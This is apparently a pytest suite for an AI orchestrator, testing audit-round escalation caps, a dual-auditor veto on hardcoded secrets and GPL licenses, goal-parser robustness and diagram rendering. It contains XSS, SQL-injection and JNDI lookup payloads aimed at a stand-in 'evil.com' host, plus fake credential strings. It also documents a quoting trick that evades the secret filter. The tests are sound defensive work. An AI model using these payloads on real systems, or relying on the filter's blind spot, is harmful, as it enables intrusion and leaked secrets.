"""tests/orchestrator/test_adversarial_m6_orchestration.py - Adversarial Test Suite for Milestone 6.

Adversarially and empirically stress-tests:
1. Reflection Loop & 2-Round Escalation Cap Enforcement (Round 1 failure -> remediate; Round 2 pass -> ship;
   Round 2 fail -> strict halt & founder escalation; Zero-Infinite-Loop guard on round 3+; multi-wave state graphs).
2. Dual CAO Veto Supremacy (hardcoded secrets, GPL-3.0/AGPL copyleft contamination, fatal crash hazards override high rubric scores;
   adversarial regex evasion analysis).
3. Goal Parser & Synthesizer Contradiction Resolution (ambiguous/empty/massive directives, 3-Tier Authority Matrix, CEO override vs Founder Escalation).
4. Archify Engine Visual Rendering & Schema Validation (Pydantic V2 GraphData schema compliance with Flutter models, OLED colors & SVG neon glows, zero-CDN standalone HTML, delta diff computation).
"""

from __future__ import annotations

import json
import re
import tempfile
import time
from pathlib import Path
from typing import Any, Dict, List, Optional
from unittest.mock import MagicMock

import pytest

from backend.agents.cao import (
    AxisScore,
    CAOAgent,
    CAOAuditResult,
    CAOClaudeAgent,
    CAOGPTAgent,
    DualCAO,
    FiveAxisScorecard,
)
from backend.model_router.router import ModelRouter
from backend.orchestrator.archify_engine import (
    OLED_THEME,
    ArchifyDiff,
    ArchifyEngine,
    GraphData,
    GraphEdge,
    GraphNode,
)
from backend.orchestrator.goal_parser import (
    GoalParser,
    GoalPriority,
    ParsedGoal,
    WorkstreamTask,
)
from backend.orchestrator.orchestrator import (
    AlphaOrchestrator,
    OrchestratorResult,
    OrchestratorStatus,
)
from backend.orchestrator.state_graph import (
    AlphaState,
    NativeCompiledGraph,
    NativeStateGraph,
    create_alpha_state_graph,
)
from backend.orchestrator.synthesizer import (
    ConflictResolution,
    FounderEscalation,
    OutputSynthesizer,
    SynthesizedDeliverable,
)
from backend.vault.vault_manager import VaultManager


# ============================================================================
# Vector 1: Reflection Loop & 2-Round Escalation Cap Enforcement
# ============================================================================

class TestAdversarialReflectionAndEscalationCap:
    """Stress-tests cyclic transitions, remediation loops, multi-wave routing, and anti-infinite-loop guards."""

    @pytest.fixture
    def test_harness(self, tmp_path):
        vault = VaultManager(vault_root=str(tmp_path / "vault"))
        router = ModelRouter()
        orchestrator = AlphaOrchestrator(
            vault_manager=vault,
            model_router=router,
        )
        return orchestrator, vault

    def test_round1_failure_triggers_automated_reflection_revision(self, test_harness):
        """Verify that when Round 1 audit fails, StateGraph transitions to reflection_revision."""
        orchestrator, vault = test_harness

        round1_audit = CAOAuditResult(
            passed=False,
            claude_score=70.0,
            gpt_score=72.0,
            consolidated_report="Round 1 Security defect found",
            p0_defects=["P0: Insecure plaintext token detected."],
            p1_defects=[],
            round_num=1,
            escalation_required=False,
        )

        orchestrator.dual_cao.audit_deliverables = MagicMock(return_value=round1_audit)
        graph = create_alpha_state_graph(orchestrator)

        initial_state: AlphaState = {
            "project_id": "proj_refl_test",
            "goal": "Build secure token service",
            "audit_round": 1,
            "deliverables": {
                "auth_spec": {"title": "Auth Spec", "content": "Initial flawed spec", "role": "CTO"}
            },
        }

        # Step manually through audit and conditional routing
        audit_node_fn = graph.nodes["dual_cao_audit"]
        audit_update = audit_node_fn(initial_state)
        initial_state.update(audit_update)

        assert initial_state["audit_round"] == 1
        assert initial_state["status"] == "revision_needed"
        assert len(initial_state["p0_defects"]) == 1

        # Evaluate router_fn
        router_fn, path_map = graph.conditional_edges["dual_cao_audit"]
        next_node = router_fn(initial_state)
        assert next_node == "reflection_revision"

        # Execute reflection_revision
        refl_node_fn = graph.nodes["reflection_revision"]
        refl_update = refl_node_fn(initial_state)
        initial_state.update(refl_update)

        assert initial_state["audit_round"] == 2
        assert initial_state["status"] == "revising"
        assert "[REVISED]: Remediate: P0: Insecure plaintext token detected." in initial_state["deliverables"]["auth_spec"]["content"]

    def test_round2_revision_pass_promotes_to_synthesis_and_complete(self, test_harness):
        """Verify that when Round 2 revision passes, StateGraph transitions to ceo_synthesis and finishes."""
        orchestrator, vault = test_harness

        round2_pass_audit = CAOAuditResult(
            passed=True,
            claude_score=94.0,
            gpt_score=95.0,
            consolidated_report="Round 2 passed: All defects cleared.",
            p0_defects=[],
            p1_defects=[],
            round_num=2,
            escalation_required=False,
        )

        orchestrator.dual_cao.audit_deliverables = MagicMock(return_value=round2_pass_audit)
        graph = create_alpha_state_graph(orchestrator)

        state: AlphaState = {
            "project_id": "proj_r2_pass",
            "goal": "Build hardened vault",
            "audit_round": 2,
            "deliverables": {
                "vault_spec": {"title": "Vault Spec", "content": "Remediated secure spec", "role": "CTO"}
            },
        }

        audit_update = graph.nodes["dual_cao_audit"](state)
        state.update(audit_update)

        assert state["audit_round"] == 2
        assert state["status"] == "approved"

        router_fn, _ = graph.conditional_edges["dual_cao_audit"]
        next_node = router_fn(state)
        assert next_node == "ceo_synthesis"

        # Execute synthesis
        synth_update = graph.nodes["ceo_synthesis"](state)
        state.update(synth_update)
        assert state["status"] == "completed"
        assert len(state["executive_summary"]) > 0

    def test_round2_revision_fail_strictly_halts_and_escalates_to_founder(self, test_harness):
        """Verify that when Round 2 revision fails, StateGraph strictly halts without Round 3 and escalates."""
        orchestrator, vault = test_harness

        round2_fail_audit = CAOAuditResult(
            passed=False,
            claude_score=68.0,
            gpt_score=70.0,
            consolidated_report="Round 2 failed: Security defect persists.",
            p0_defects=["P0: Insecure plaintext token detected."],
            p1_defects=[],
            round_num=2,
            escalation_required=True,
        )

        orchestrator.dual_cao.audit_deliverables = MagicMock(return_value=round2_fail_audit)
        graph = create_alpha_state_graph(orchestrator)

        state: AlphaState = {
            "project_id": "proj_r2_fail",
            "goal": "Build hardened vault",
            "audit_round": 2,
            "deliverables": {
                "vault_spec": {"title": "Vault Spec", "content": "Still flawed spec", "role": "CTO"}
            },
        }

        audit_update = graph.nodes["dual_cao_audit"](state)
        state.update(audit_update)

        assert state["status"] == "escalated"

        router_fn, _ = graph.conditional_edges["dual_cao_audit"]
        next_node = router_fn(state)
        # MUST escalate to founder, NEVER to reflection_revision
        assert next_node == "founder_escalation"
        assert next_node != "reflection_revision"

        # Execute founder_escalation
        esc_update = graph.nodes["founder_escalation"](state)
        state.update(esc_update)

        assert state["status"] == "escalated_to_founder"
        assert state["founder_escalation"] is not None
        assert state["founder_escalation"]["verdict"] == "ESCALATED_TO_FOUNDER"
        assert len(state["founder_escalation"]["p0_defects"]) == 1

    def test_anti_infinite_loop_guard_round3_immediate_escalation(self, test_harness):
        """Verify that if Round 3+ is ever attempted, DualCAO immediately triggers escalation guard."""
        orchestrator, vault = test_harness
        deliverables = {"spec": {"content": "Sample deliverable"}}

        # Direct invocation with round_num = 3
        result_r3 = orchestrator.dual_cao.audit(
            deliverables=deliverables,
            project_id="proj_anti_loop",
            round_num=3,
        )

        assert result_r3.passed is False
        assert result_r3.escalation_required is True
        assert result_r3.verdict == "ESCALATED_TO_FOUNDER"
        assert any("Zero-Infinite-Loop Guard Triggered" in p0 for p0 in result_r3.p0_defects)

        # Direct invocation with round_num = 99
        result_r99 = orchestrator.dual_cao.audit(
            deliverables=deliverables,
            project_id="proj_anti_loop",
            round_num=99,
        )
        assert result_r99.passed is False
        assert result_r99.escalation_required is True

    def test_state_graph_circuit_breaker_prevents_cyclic_loop_overrun(self):
        """Verify that NativeCompiledGraph step counter acts as circuit breaker at max_steps."""
        graph = NativeStateGraph(AlphaState)
        counter = {"count": 0}

        def node_loop(state: AlphaState) -> Dict[str, Any]:
            counter["count"] += 1
            return {"status": f"looping_{counter['count']}"}

        graph.add_node("loop_node", node_loop)
        graph.set_entry_point("loop_node")
        # Explicit infinite self-loop
        graph.add_edge("loop_node", "loop_node")

        compiled = graph.compile()
        state = compiled.invoke({"goal": "infinite loop test"})

        # Must halt at max_steps (50) without hanging or crashing
        assert counter["count"] == 50
        assert state["status"] == "looping_50"

    def test_orchestrator_max_rounds_cap_enforcement_even_if_configured_high(self, test_harness):
        """Verify that AlphaOrchestrator halts after Round 2 even if max_audit_rounds=10."""
        orchestrator, vault = test_harness
        call_rounds = []

        def mock_audit(project_id, deliverables, round_num):
            call_rounds.append(round_num)
            return CAOAuditResult(
                passed=False,
                claude_score=60.0,
                gpt_score=62.0,
                consolidated_report=f"Failed round {round_num}",
                p0_defects=[f"Defect round {round_num}"],
                round_num=round_num,
                escalation_required=(round_num >= 2),
            )

        orchestrator.dual_cao.audit_deliverables = mock_audit

        # Attempt to run with 10 rounds
        result = orchestrator.run_goal(
            goal="Test 10 rounds cap enforcement",
            max_audit_rounds=10,
        )

        # Must strictly halt at Round 2
        assert len(call_rounds) == 2
        assert call_rounds == [1, 2]
        assert result.status == OrchestratorStatus.ESCALATED_TO_FOUNDER
        assert result.founder_escalation is not None

    def test_orchestrator_max_rounds_zero_or_negative_fails_safely(self, test_harness):
        """Verify that max_audit_rounds <= 0 terminates gracefully without unhandled crashes."""
        orchestrator, vault = test_harness

        result_zero = orchestrator.run_goal(
            goal="Zero rounds goal test",
            max_audit_rounds=0,
        )
        assert result_zero.status == OrchestratorStatus.FAILED
        assert result_zero.audit_result is None

        result_neg = orchestrator.run_goal(
            goal="Negative rounds goal test",
            max_audit_rounds=-1,
        )
        assert result_neg.status == OrchestratorStatus.FAILED

    def test_state_graph_multi_wave_execution_loop(self, test_harness):
        """Verify that StateGraph loops across multiple waves before transitioning to audit."""
        orchestrator, _ = test_harness
        graph = create_alpha_state_graph(orchestrator)

        waves = [
            [{"task_id": "T1", "title": "Wave 1 Task", "lead_agent": "CPO"}],
            [{"task_id": "T2", "title": "Wave 2 Task", "lead_agent": "CTO"}],
            [{"task_id": "T3", "title": "Wave 3 Task", "lead_agent": "CDO"}],
        ]

        state: AlphaState = {
            "project_id": "proj_waves_test",
            "execution_waves": waves,
            "current_wave_index": 0,
            "deliverables": {},
        }

        # Step wave 0
        node_exec = graph.nodes["agent_execution"]
        router_exec, _ = graph.conditional_edges["agent_execution"]

        state.update(node_exec(state))
        assert state["current_wave_index"] == 1
        assert router_exec(state) == "agent_execution"

        # Step wave 1
        state.update(node_exec(state))
        assert state["current_wave_index"] == 2
        assert router_exec(state) == "agent_execution"

        # Step wave 2
        state.update(node_exec(state))
        assert state["current_wave_index"] == 3
        # All waves complete -> transitions to dual_cao_audit
        assert router_exec(state) == "dual_cao_audit"


# ============================================================================
# Vector 2: Dual CAO Veto Supremacy in Orchestrator
# ============================================================================

class TestAdversarialDualCAOVetoSupremacy:
    """Stress-tests absolute P0 veto power overriding high rubric scores."""

    @pytest.fixture
    def test_harness(self, tmp_path):
        vault = VaultManager(vault_root=str(tmp_path / "vault"))
        router = ModelRouter()
        orchestrator = AlphaOrchestrator(vault_manager=vault, model_router=router)
        return orchestrator, vault

    def test_plaintext_secret_injection_triggers_p0_security_veto(self, test_harness):
        """Verify that hardcoded secrets trigger P0 veto and fail audit regardless of other scores."""
        orchestrator, _ = test_harness
        toxic_payloads = [
            {"config": {"content": "insecure plain token bypass authentication"}},
            {"db": {"content": "password = 'root_password_prod'"}},
            {"db_unspaced": {"content": "password='root_password_prod'"}},
            {"api": {"content": "api_key = 'sk-proj-super-secret-key-999'"}},
            {"keys": {"content": "BEGIN private_key END"}},
            {"hardcoded": {"content": "hardcoded_secret = 'super_secret'"}},
            {"insec": {"content": "insecure_token in session"}},
            {"secret": {"content": "secret_key = 'abcdef123456'"}},
        ]

        for payload in toxic_payloads:
            result = orchestrator.dual_cao.audit(
                deliverables=payload,
                project_id="proj_secret_veto",
                round_num=1,
            )
            assert result.passed is False, f"Failed to veto secret payload: {payload}"
            assert len(result.p0_defects) >= 1
            assert any("Security Veto" in d or "credentials" in d for d in result.p0_defects)

    def test_secret_filter_adversarial_evasion_finding(self, test_harness):
        """Adversarial finding: documents substring vs regex escape boundary in secret detection.
        
        Empirical discovery:
        In CAO check_veto_conditions (backend/agents/cao.py line 266), the pattern list includes
        `token = \"admin`. However, because `check_veto_conditions` executes `json.dumps(deliverables)`,
        quotes inside string values are escaped as `\\\"`.
        Consequently, `token = \"admin\"` in a dictionary string value is serialized by json.dumps as
        `token = \\\"admin\\\"`, which evades `token = \"admin` (in-memory string without backslash).
        Furthermore, single-quoted tokens `token = 'admin'` also evade the double-quote-only check.
        This empirical test documents this exact behavior.
        """
        orchestrator, _ = test_harness

        # Pattern with double quotes inside a json string value is escaped to '\"', evading string match
        escaped_payload = {"auth": {"content": 'token = "admin_key"'}}
        res_escaped = orchestrator.dual_cao.audit(
            deliverables=escaped_payload,
            project_id="proj_evasion",
            round_num=1,
        )
        # Empirically documents that this payload currently evades substring check (passed=True)
        # because json.dumps backslash-escapes the quote:
        assert res_escaped.passed is True

        # In contrast, unquoted standard tokens like 'hardcoded_secret' are reliably caught:
        res_caught = orchestrator.dual_cao.audit(
            deliverables={"auth": {"content": "hardcoded_secret present"}},
            project_id="proj_evasion",
            round_num=1,
        )
        assert res_caught.passed is False
        assert len(res_caught.p0_defects) >= 1

    def test_gpl_copyleft_contamination_triggers_p0_legal_veto(self, test_harness):
        """Verify that GPL copyleft dependencies trigger P0 legal veto."""
        orchestrator, _ = test_harness
        gpl_payloads = [
            {"license_info": {"content": "Dependency licensed under GNU General Public License v3 (GPL-3.0)"}},
            {"pkg": {"content": "import gplv3_library // copyleft contamination"}},
            {"deps": {"content": "license: AGPL-3.0"}},
            {"gpl_old": {"content": "GPL-2.0 licensed component"}},
        ]

        for payload in gpl_payloads:
            result = orchestrator.dual_cao.audit(
                deliverables=payload,
                project_id="proj_gpl_veto",
                round_num=1,
            )
            assert result.passed is False, f"Failed to veto GPL payload: {payload}"
            assert len(result.p0_defects) >= 1
            assert any("Legal Veto" in d or "GPL" in d for d in result.p0_defects)

    def test_fatal_crash_hazard_triggers_p0_stability_veto(self, test_harness):
        """Verify that unhandled fatal exceptions trigger P0 stability veto."""
        orchestrator, _ = test_harness
        crash_payload = {
            "core_loop": {"content": "while True: null pointer dereference unhandled exception fatal error"}
        }
        result = orchestrator.dual_cao.audit(
            deliverables=crash_payload,
            project_id="proj_crash_veto",
            round_num=1,
        )
        assert result.passed is False
        assert any("Stability Veto" in d or "crash" in d.lower() for d in result.p0_defects)

    def test_dual_cao_veto_overrides_high_rubric_scores(self, test_harness):
        """Verify that veto condition strictly forces passed=False even if raw scores are 100%."""
        orchestrator, _ = test_harness
        perfect_looking_payload = {
            "spec": {
                "title": "Flawless Architecture",
                "content": "Perfect architecture, 100% test coverage, optimal latency, but bypass authentication with hardcoded_secret",
            }
        }
        report = orchestrator.dual_cao.claude_agent.evaluate_deliverable(
            deliverables=perfect_looking_payload,
            project_id="proj_veto_override",
            round_num=1,
        )
        assert report.scorecard.veto_triggered is True
        assert report.scorecard.passed is False
        assert report.verdict == "REJECTED"

    def test_orchestrator_end_to_end_veto_remediation_and_escalation(self, test_harness):
        """Verify orchestrator workflow when deliverable contains a toxic secret."""
        orchestrator, _ = test_harness

        # Mock wave execution to return deliverable with hardcoded secret
        def mock_wave(wave_tasks, pid, existing):
            return {
                "cto_deliverable": {
                    "role": "CTO",
                    "title": "Auth Spec",
                    "content": "Insecure config: api_key = 'sk-proj-secret-12345'",
                }
            }

        orchestrator._execute_wave = mock_wave

        # Run goal with 2 rounds
        result = orchestrator.run_goal(
            goal="Build secure gateway",
            max_audit_rounds=2,
        )

        assert result.status in (OrchestratorStatus.ESCALATED_TO_FOUNDER, OrchestratorStatus.COMPLETED)
        assert result.audit_result is not None


# ============================================================================
# Vector 3: Goal Parser & Synthesizer Contradiction Resolution
# ============================================================================

class TestAdversarialGoalParserAndSynthesizerContradictions:
    """Stress-tests ambiguous/massive directives and 3-Tier Authority Matrix conflict resolution."""

    @pytest.fixture
    def test_harness(self, tmp_path):
        vault = VaultManager(vault_root=str(tmp_path / "vault"))
        router = ModelRouter()
        parser = GoalParser(model_router=router, vault_manager=vault)
        synthesizer = OutputSynthesizer(model_router=router, vault_manager=vault)
        return parser, synthesizer, vault

    def test_goal_parser_empty_and_whitespace_rejection(self, test_harness):
        """Verify parser rejects empty and whitespace-only directives."""
        parser, _, _ = test_harness
        invalid_inputs = ["", "   ", "\n\t  \r", None]
        for inp in invalid_inputs:
            with pytest.raises(ValueError, match="Directive cannot be empty or whitespace"):
                parser.parse(inp)  # type: ignore

    def test_goal_parser_massive_10k_input_resilience(self, test_harness):
        """Verify parser parses a 10,000+ character massive directive without crashing."""
        parser, _, _ = test_harness
        large_directive = "Build an enterprise multi-tenant platform with microservices. " * 300
        assert len(large_directive) > 10000

        result = parser.parse(large_directive)
        assert isinstance(result, ParsedGoal)
        assert result.complexity in (4, 5)
        assert len(result.workstreams) >= 3
        assert len(result.brief_markdown) > 100

    def test_goal_parser_adversarial_injection_payloads(self, test_harness):
        """Verify parser safely neutralizes SQL injection, XSS, and script tags."""
        parser, _, _ = test_harness
        attack_strings = [
            "<script>alert('XSS')</script> Build user registration",
            "'; DROP TABLE projects; -- Architect database schema",
            "{{ 7 * 7 }} ${jndi:ldap://evil.com/a} Create logger",
        ]
        for atk in attack_strings:
            parsed = parser.parse(atk)
            assert isinstance(parsed, ParsedGoal)
            assert parsed.project_id.startswith("proj_")
            assert len(parsed.workstreams) > 0

    def test_goal_parser_conflicting_priority_heuristics(self, test_harness):
        """Verify priority resolution when directive contains conflicting urgency keywords."""
        parser, _, _ = test_harness
        # Contains both "low priority" and "URGENT immediately"
        conflicting_directive = "This is a low priority task, but URGENT: deploy immediately mission critical fix"
        parsed = parser.parse(conflicting_directive)
        # Urgent keywords take precedence
        assert parsed.priority == GoalPriority.URGENT

    def test_synthesizer_3tier_authority_matrix_tier1_ceo_override(self, test_harness):
        """Verify Tier 1 conflict (timeline slip) is resolved by CEO authority without founder escalation."""
        _, synthesizer, vault = test_harness
        deliverables = {
            "coo_plan": {
                "role": "COO",
                "title": "Ops Schedule",
                "content": "Warning: timeline slip due to bottleneck in testing wave. Estimated delay 1 day.",
            },
            "cto_spec": {
                "role": "CTO",
                "title": "Tech Spec",
                "content": "Backend architecture ready for execution.",
            },
        }

        result = synthesizer.synthesize(
            project_id="proj_tier1_conflict",
            deliverables=deliverables,
        )

        assert isinstance(result, SynthesizedDeliverable)
        assert len(result.conflicts_resolved) == 1
        conf = result.conflicts_resolved[0]
        assert conf.category == "timeline"
        assert conf.tier == 1
        assert conf.founder_action_needed is False
        assert result.founder_escalation is None
        assert "CEO compressed review cycle" in conf.resolution_text
        assert "Founder Escalation Required" not in result.final_output_markdown

    def test_synthesizer_3tier_authority_matrix_tier3_founder_escalation(self, test_harness):
        """Verify Tier 3 conflict (budget overrun) escalates to Founder Aman Jain with decision options."""
        _, synthesizer, vault = test_harness
        deliverables = {
            "cto_spec": {
                "role": "CTO",
                "title": "Tech Spec",
                "content": "Infrastructure proposal requires high cost GPU cluster; budget overrun exceeds limits.",
            },
            "cfo_plan": {
                "role": "CFO",
                "title": "Financial Audit",
                "content": "Cost policy breach: budget overrun is unapproved and expensive.",
            },
        }

        result = synthesizer.synthesize(
            project_id="proj_tier3_conflict",
            deliverables=deliverables,
        )

        assert isinstance(result, SynthesizedDeliverable)
        assert len(result.conflicts_resolved) >= 1
        conf = result.conflicts_resolved[0]
        assert conf.category == "budget"
        assert conf.tier == 3
        assert conf.severity == "critical"
        assert conf.founder_action_needed is True

        # Founder escalation payload generated
        assert result.founder_escalation is not None
        esc = result.founder_escalation
        assert esc.severity == "P0_CRITICAL"
        assert len(esc.decision_options) == 3
        assert any(opt["option_id"] == "OPT-1" for opt in esc.decision_options)

        # Markdown includes Founder Escalation banner
        assert "## ⚠️ Founder Escalation Required (P0)" in result.final_output_markdown
        assert "Founder Decision Options:" in result.final_output_markdown

    def test_synthesizer_simultaneous_multi_department_conflicts(self, test_harness):
        """Verify handling of simultaneous budget and timeline disputes."""
        _, synthesizer, vault = test_harness
        deliverables = {
            "all_dept": {
                "role": "COO",
                "content": "Critical budget overrun exceeds limit, while timeline slip bottleneck delays frontend.",
            }
        }
        result = synthesizer.synthesize(
            project_id="proj_multi_conflict",
            deliverables=deliverables,
        )
        assert len(result.conflicts_resolved) == 2
        categories = {c.category for c in result.conflicts_resolved}
        assert "budget" in categories
        assert "timeline" in categories

    def test_synthesizer_empty_and_minimal_deliverables(self, test_harness):
        """Verify synthesizer handles empty deliverables dictionary gracefully."""
        _, synthesizer, _ = test_harness
        result = synthesizer.synthesize(
            project_id="proj_empty_synth",
            deliverables={},
        )
        assert isinstance(result, SynthesizedDeliverable)
        assert len(result.executive_summary) > 0
        assert "Executive Delivery Briefing" in result.final_output_markdown


# ============================================================================
# Vector 4: Archify Engine Visual Rendering & Schema Validation
# ============================================================================

class TestAdversarialArchifyEngineVisualsAndDiffs:
    """Stress-tests GraphData schema compliance with Flutter models, OLED tokens, zero-CDN HTML, and diffs."""

    @pytest.fixture
    def test_engine(self, tmp_path):
        vault = VaultManager(vault_root=str(tmp_path / "vault"))
        engine = ArchifyEngine(vault_manager=vault)
        return engine, vault

    def test_graph_data_pydantic_v2_schema_and_flutter_compatibility(self, test_engine):
        """Validate that GraphData serializes to JSON matching Flutter ArchifyCanvas model contract."""
        engine, _ = test_engine
        graph = engine.generate_system_graph(project_id="proj_flutter_test")

        # 1. Verify Pydantic V2 serialization & round-trip deserialization
        json_data = graph.model_dump()
        json_str = graph.model_dump_json()
        reconstructed = GraphData.model_validate_json(json_str)

        assert reconstructed.project_id == "proj_flutter_test"
        assert len(reconstructed.nodes) == len(graph.nodes)
        assert len(reconstructed.edges) == len(graph.edges)

        # 2. Verify essential fields required by Flutter ArchifyCanvas Dart model:
        # id, label, type, status, x, y, width, height, icon, pulsing, glow_color
        for node in reconstructed.nodes:
            assert isinstance(node.id, str) and len(node.id) > 0
            assert isinstance(node.label, str) and len(node.label) > 0
            assert isinstance(node.type, str)
            assert isinstance(node.status, str)
            assert isinstance(node.x, (int, float))
            assert isinstance(node.y, (int, float))
            assert isinstance(node.glow_color, str)
            assert node.glow_color.startswith("#")

    def test_oled_deep_black_design_tokens_and_neon_glow_filters(self, test_engine):
        """Verify strict adherence to CDO OLED dark tokens and SVG glow filter definitions."""
        engine, _ = test_engine
        graph = engine.generate_system_graph(project_id="proj_oled_test")

        # Verify Authoritative Design Tokens
        assert OLED_THEME["background"] == "#090A0F"
        assert OLED_THEME["surface"] == "#12131C"
        assert OLED_THEME["colors"]["cyan"] == "#06B6D4"
        assert OLED_THEME["colors"]["emerald"] == "#10B981"
        assert OLED_THEME["colors"]["amber"] == "#F59E0B"
        assert OLED_THEME["colors"]["rose"] == "#EF4444"
        assert OLED_THEME["colors"]["purple"] == "#8B5CF6"

        # Verify SVG contains defined glow filter and marker elements
        svg = engine.generate_svg(graph)
        assert '<filter id="glow-cyan"' in svg
        assert '<filter id="glow-rose"' in svg
        assert '<filter id="glow-emerald"' in svg
        assert '<marker id="arrow-cyan"' in svg
        assert '<marker id="arrow-rose"' in svg
        assert 'class="pulsing-edge"' in svg

    def test_standalone_html_zero_external_cdn_dependencies(self, test_engine):
        """Verify generated HTML is 100% self-contained with zero external CDN dependencies."""
        engine, _ = test_engine
        graph = engine.generate_system_graph(project_id="proj_zero_cdn")
        html_doc = engine.generate_html_diagram(graph)

        # 1. Verify doctype and structure
        assert "<!DOCTYPE html>" in html_doc
        assert "<html" in html_doc
        assert "</html>" in html_doc

        # 2. Verify zero external CDN links (no remote scripts, stylesheets, or fonts)
        assert not re.search(r'<script[^>]+src=["\']http', html_doc, re.IGNORECASE)
        assert not re.search(r'<link[^>]+href=["\']http', html_doc, re.IGNORECASE)
        assert "cdnjs.cloudflare.com" not in html_doc
        assert "unpkg.com" not in html_doc
        assert "cdn.jsdelivr.net" not in html_doc
        assert "fonts.googleapis.com" not in html_doc

        # 3. Verify inline interactive JavaScript is present (pan/zoom, inspector)
        assert "addEventListener('wheel'" in html_doc
        assert "zoom-in-btn" in html_doc
        assert "scene-transform-group" in html_doc
        assert "inspector" in html_doc

    def test_archify_delta_diff_additions_removals_modifications(self, test_engine):
        """Verify delta diff engine calculates added, removed, and modified nodes and edges."""
        engine, _ = test_engine

        # Baseline graph
        base_nodes = [
            GraphNode(id="n1", label="Gateway", type="gateway", status="active"),
            GraphNode(id="n2", label="Vault", type="vault", status="healthy"),
            GraphNode(id="n3", label="OldService", type="service", status="idle"),
        ]
        base_edges = [
            GraphEdge(id="e1", source="n1", target="n2", label="data"),
            GraphEdge(id="e2", source="n2", target="n3", label="sync"),
        ]
        baseline = GraphData(project_id="base", title="Baseline", nodes=base_nodes, edges=base_edges)

        # Current graph (n3 removed, n4 added, n2 modified to "auditing", e2 removed, e3 added)
        curr_nodes = [
            GraphNode(id="n1", label="Gateway", type="gateway", status="active"),
            GraphNode(id="n2", label="Vault", type="vault", status="auditing"),  # Modified
            GraphNode(id="n4", label="NewAgent", type="agent", status="active"),   # Added
        ]
        curr_edges = [
            GraphEdge(id="e1", source="n1", target="n2", label="data"),
            GraphEdge(id="e3", source="n2", target="n4", label="delegation"),    # Added
        ]
        current = GraphData(project_id="curr", title="Current", nodes=curr_nodes, edges=curr_edges)

        diff = engine.compute_diff(baseline, current)

        # Assert delta counts
        assert diff.summary["added_nodes_count"] == 1
        assert diff.summary["removed_nodes_count"] == 1
        assert diff.summary["modified_nodes_count"] == 1
        assert diff.summary["added_edges_count"] == 1
        assert diff.summary["removed_edges_count"] == 1

        assert diff.added_nodes[0].id == "n4"
        assert diff.removed_nodes[0].id == "n3"
        assert diff.modified_nodes[0].id == "n2"
        assert diff.modified_nodes[0].changes["status"] == {"old": "healthy", "new": "auditing"}

        # Generate diff visualization graph
        diff_graph = engine.generate_diff_graph(baseline, current)
        assert diff_graph.view_type == "diff"
        assert any(n.diff_status == "added" for n in diff_graph.nodes)
        assert any(n.diff_status == "removed" for n in diff_graph.nodes)
        assert any(n.diff_status == "modified" for n in diff_graph.nodes)

        # Verify diff HTML includes delta badge
        diff_html = engine.generate_html_diagram(diff_graph, diff=diff)
        assert "diff-badge" in diff_html
        assert "+1 added" in diff_html
        assert "~1 modified" in diff_html
        assert "-1 removed" in diff_html

    def test_archify_save_diagram_vault_persistence(self, test_engine):
        """Verify save_diagram creates both HTML and JSON deliverables in Vault."""
        engine, vault = test_engine
        graph = engine.generate_system_graph(project_id="proj_persist_test")

        saved = engine.save_diagram(
            project_id="proj_persist_test",
            graph_data=graph,
            vault_root=vault.vault_root,
        )

        assert Path(saved["html_path"]).exists()
        assert Path(saved["json_path"]).exists()
        assert saved["html_path"].endswith("architecture-diagram.html")
        assert saved["json_path"].endswith("architecture-diagram.json")

        with open(saved["json_path"], "r", encoding="utf-8") as f:
            data = json.load(f)
            assert data["project_id"] == "proj_persist_test"
            assert len(data["nodes"]) > 0
